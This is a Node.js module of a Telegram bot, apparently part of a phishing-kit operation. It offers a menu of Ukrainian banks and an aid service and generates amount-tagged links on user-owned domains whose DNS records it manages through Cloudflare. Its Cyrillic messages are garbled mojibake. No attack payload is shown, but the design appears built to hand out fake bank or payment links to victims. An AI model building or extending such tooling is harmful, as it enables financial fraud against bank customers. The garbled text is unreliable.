const crypto = require('crypto');
const { applications } = require('./storage');

const serviceLinks = {
  '–î–æ–ø–æ–º–æ–≥–∞': 'https://t.me/dopomoga_group',
  '–†–∞–π—Ñ': 'https://t.me/raif_group',
  '–û—â–∞–¥': 'https://t.me/oshchad_group',
  '–ü—Ä–∏–≤–∞—Ç': 'https://t.me/privat_group',
  '–í–∞–π–±–µ—Ä': 'https://t.me/viber_group',
};

const generateLink = (service, amount, userId) => {
  const userDomain = Object.entries(applications.domains || {})
    .find(([_, data]) => data.ownerId === String(userId) && data.active && data.verified)?.[0];
  const baseUrl = userDomain ? `https://${userDomain}` : (serviceLinks[service] || 'https://t.me/fallback_group');
  const id = crypto.randomUUID();
  const url = `${baseUrl}?amount=${amount}&id=${id}`;
  if (!url.startsWith('https://')) {
    console.error(`–û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π URL –¥–ª—è —Å–µ—Ä–≤–∏—Å–∞ ${service} –∏–ª–∏ –¥–æ–º–µ–Ω–∞ ${userDomain}: ${url}`);
    return 'https://t.me/fallback_group';
  }
  console.log(`–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è ${userId}: ${url}`);
  return url;
};

const showServices = (ctx) => {
  console.log(`–ü–æ–∫–∞–∑ —Å–ø–∏—Å–∫–∞ —Å–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è ${ctx.from.id}`);
  ctx.reply('–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–∏—Å:', {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '1 - –î–æ–ø–æ–º–æ–≥–∞', callback_data: 'service_dopomoga' },
          { text: '2 - –†–∞–π—Ñ', callback_data: 'service_raif' },
        ],
        [
          { text: '3 - –û—â–∞–¥', callback_data: 'service_oshchad' },
          { text: '4 - –ü—Ä–∏–≤–∞—Ç', callback_data: 'service_privat' },
        ],
        [{ text: '5 - –í–∞–π–±–µ—Ä', callback_data: 'service_viber' }],
      ],
    },
  });
};

const retryRequest = async (fn, maxRetries = 3, baseDelay = 1000) => {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (error.code === 429 && error.response?.parameters?.retry_after) {
        const retryAfter = error.response.parameters.retry_after * 1000;
        console.log(`[retryRequest] –û—à–∏–±–∫–∞ 429, –∂–¥–µ–º ${retryAfter} –º—Å –ø–µ—Ä–µ–¥ –ø–æ–ø—ã—Ç–∫–æ–π ${attempt + 1}`);
        await new Promise((resolve) => setTimeout(resolve, retryAfter));
        continue;
      }
      console.error(`[retryRequest] –û—à–∏–±–∫–∞: ${error.message}, –ø–æ–ø—ã—Ç–∫–∞ ${attempt}`);
      if (attempt === maxRetries) throw error;
      await new Promise((resolve) => setTimeout(resolve, baseDelay * attempt));
    }
  }
  throw new Error(`–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–ø—Ä–æ—Å –ø–æ—Å–ª–µ ${maxRetries} –ø–æ–ø—ã—Ç–æ–∫`);
};

async function logDnsRecords(zoneId, domain, ctx, cf) {
  try {
    const records = await cf.dnsRecords.browse(zoneId);
    if (!records || !records.result) {
      await ctx.reply(`‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å DNS-–∑–∞–ø–∏—Å–∏ –¥–ª—è ${domain}`);
      return;
    }
    let out = `üìú DNS-–∑–∞–ø–∏—Å–∏ –¥–ª—è ${domain}:\n`;
    for (const r of records.result) {
      out += `‚Ä¢ ${r.type} ${r.name} ‚Üí ${r.content} (TTL ${r.ttl})\n`;
    }
    await ctx.reply(out);
  } catch (e) {
    console.error('–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è DNS:', e.message);
    await ctx.reply(`–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è DNS-–∑–∞–ø–∏—Å–µ–π: ${e.message}`);
  }
}

module.exports = { serviceLinks, generateLink, showServices, retryRequest, logDnsRecords };
